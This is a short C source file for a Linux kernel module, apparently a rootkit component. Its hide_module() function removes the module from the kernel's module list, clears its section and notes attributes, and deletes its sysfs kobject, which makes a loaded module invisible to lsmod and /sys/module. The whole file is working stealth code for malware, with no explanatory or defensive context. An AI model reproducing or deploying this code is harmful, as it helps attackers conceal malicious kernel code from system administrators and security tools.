#include <linux/types.h>

#include "hide_module.h"


void hide_module(void)
{
    THIS_MODULE->sect_attrs = NULL;
    THIS_MODULE->notes_attrs = NULL;

#ifndef DEBUG
    kobject_del(&THIS_MODULE->mkobj.kobj);    
#endif

    list_del(&THIS_MODULE->list);
}